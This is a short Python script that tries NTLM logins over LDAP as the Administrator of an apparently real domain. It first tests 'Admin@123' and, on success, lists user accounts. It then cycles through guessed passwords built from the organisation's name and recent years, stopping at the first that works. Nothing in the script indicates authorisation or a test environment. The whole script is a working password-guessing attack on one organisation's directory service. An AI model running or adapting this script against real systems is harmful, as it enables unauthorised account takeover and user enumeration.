from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
import sys

server = Server('******', get_info=ALL, use_ssl=False, port=389, connect_timeout=10)

print("=== Test 1: NTLM with Admin@123 ===")
try:
    conn = Connection(server, user='cii.sh.cn\\Administrator', password='Admin@123', 
                      authentication=NTLM, auto_bind=False)
    result = conn.bind()
    print(f"Bind result: {result}, Error: {conn.result}")
    if result:
        conn.search('DC=cii,DC=sh,DC=cn', '(objectClass=user)', 
                    attributes=['sAMAccountName','displayName'], size_limit=10)
        print(f"Users: {len(conn.entries)}")
        for e in conn.entries[:5]:
            print(f"  {e.sAMAccountName}")
        conn.unbind()
except Exception as ex:
    print(f"Error: {ex}")

print("\n=== Test 2: NTLM with various passwords ===")
passwords = ['Admin@123', 'Admin@1234', 'P@ssw0rd', 'P@ssword1', 'Cii@2024', 'Cii@2025', 'Htkiss@2024', 'Htkiss@2025']
for pwd in passwords:
    try:
        conn = Connection(server, user='cii.sh.cn\\Administrator', password=pwd,
                          authentication=NTLM, auto_bind=False, receive_timeout=5)
        result = conn.bind()
        if result:
            print(f"SUCCESS: {pwd}")
            conn.unbind()
            sys.exit(0)
        else:
            desc = conn.result.get('description', 'unknown')
            print(f"FAILED: {pwd} -> {desc}")
        conn.unbind()
    except Exception as ex:
        print(f"ERROR: {pwd} -> {ex}")